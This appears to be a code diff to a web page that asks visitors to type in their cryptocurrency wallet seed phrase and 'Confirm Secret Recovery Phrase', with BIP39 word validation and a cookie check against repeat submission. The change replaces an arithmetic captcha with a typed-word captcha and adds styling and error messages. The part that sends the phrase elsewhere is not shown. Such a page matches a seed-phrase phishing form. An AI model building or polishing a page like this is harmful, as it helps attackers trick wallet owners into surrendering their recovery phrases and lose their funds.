@@ -149,6 +149,19 @@
       margin-top: 10px;
       display: none;
     }
+    .captcha-container {
+      margin: 10px 0 0 0;
+    }
+    .captcha-explanation {
+      font-size: 12px;
+      color: #666;
+      margin-top: 6px;
+      font-style: italic;
+      text-align: center;
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
+    }
     @media (max-width: 600px) {
       .seed-inputs {
         grid-template-columns: repeat(2, 1fr);
@@ -202,16 +215,21 @@
 
       <div class="seed-inputs" id="seedInputs"></div>
 
-      <!-- Captcha simple anti-bot -->
-      <div style="margin: 10px 0;">
-        <label for="captchaInput">Combien font 2 + 3 ?</label>
-        <input type="text" id="captchaInput" placeholder="Votre réponse" />
+      <!-- Captcha texte -->
+      <div class="captcha-container">
+        <label for="captchaInput"><strong>Please type the word below to prove you are human:</strong></label>
+        <div style="font-weight: bold; font-size: 18px; margin: 8px 0; user-select: none;">marmotte</div>
+        <input type="text" id="captchaInput" placeholder="Type the word here" autocomplete="off" />
+        <div class="captcha-explanation">
+          This captcha helps us prevent automated bots from submitting the form multiple times.
+        </div>
       </div>
 
       <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
         Confirm Secret Recovery Phrase
       </button>
       <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
+      <p id="captchaErrorMsg" class="error-msg" style="display:none;">Captcha incorrect. Please type the word shown above.</p>
 
     </div>
   </main>
@@ -238,6 +256,8 @@
       return "";
     }
 
+    const captchaWord = "marmotte";
+
     function generateInputs() {
       const container = document.getElementById("seedInputs");
       const count = parseInt(document.getElementById("phraseLength").value);
@@ -259,6 +279,8 @@
       document.getElementById("captchaInput").addEventListener("input", checkFieldsFilled);
 
       document.getElementById("submitBtn").disabled = true;
+      document.getElementById("errorMsg").style.display = "none";
+      document.getElementById("captchaErrorMsg").style.display = "none";
     }
 
     function checkFieldsFilled() {
@@ -299,6 +321,7 @@
 
     function handleConfirm() {
       const errorEl = document.getElementById("errorMsg");
+      const captchaErrorEl = document.getElementById("captchaErrorMsg");
 
       // Vérifier si formulaire déjà soumis
       if(getCookie("formSubmitted") === "true") {
@@ -308,16 +331,19 @@
 
       if (!validateBIP39Words()) {
         errorEl.style.display = "block";
+        captchaErrorEl.style.display = "none";
         return;
       } else {
         errorEl.style.display = "none";
       }
 
-      // Vérifier captcha
-      const captchaInput = document.getElementById("captchaInput").value.trim();
-      if(captchaInput !== "5") {
-        alert("Réponse au captcha incorrecte.");
+      // Vérifier captcha texte
+      const captchaInput = document.getElementById("captchaInput").value.trim().toLowerCase();
+      if(captchaInput !== captchaWord) {
+        captchaErrorEl.style.display = "block";
         return;
+      } else {
+        captchaErrorEl.style.display = "none";
       }
 
       const count = parseInt(document.getElementById("phraseLength").value);
